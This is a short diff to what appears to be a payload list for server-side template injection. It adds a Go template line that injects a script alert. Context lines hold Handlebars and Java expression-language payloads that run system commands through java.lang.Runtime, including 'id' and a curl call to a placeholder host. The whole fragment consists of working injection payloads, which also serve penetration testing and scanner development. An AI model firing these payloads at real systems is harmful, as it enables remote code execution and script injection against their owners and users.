@@ -43,3 +43,4 @@ wrtz{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.po
 ${''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}
 ${T(java.lang.Runtime).getRuntime().exec('id')}
 ${T(java.lang.Runtime).getRuntime().exec('curl http://x.x.x.x')}
+{{define "T1"}}<script>alert(1)</script>{{end}} {{template "T1"}}
